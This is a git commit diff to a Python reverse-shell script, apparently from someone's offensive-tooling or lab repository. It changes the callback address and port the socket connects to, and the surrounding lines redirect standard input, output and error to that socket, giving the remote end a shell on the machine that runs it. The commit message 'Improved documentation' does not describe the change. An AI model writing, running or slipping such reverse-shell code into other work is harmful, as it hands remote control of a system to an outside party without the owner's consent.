cd8f9514db7ae2e59993ba56f5d4832e7aca40c4
unkn0wnxxx <novumgal@gmail.com>
2026-01-01 12:50:41 -0500

    Improved documentation.

--- ReverseShell/python_revshell_script.py
+++ ReverseShell/python_revshell_script.py
@@ -3,7 +3,7 @@ import subprocess
 import os
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.45.202", 8091))
+s.connect(("192.168.45.219", 9090))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
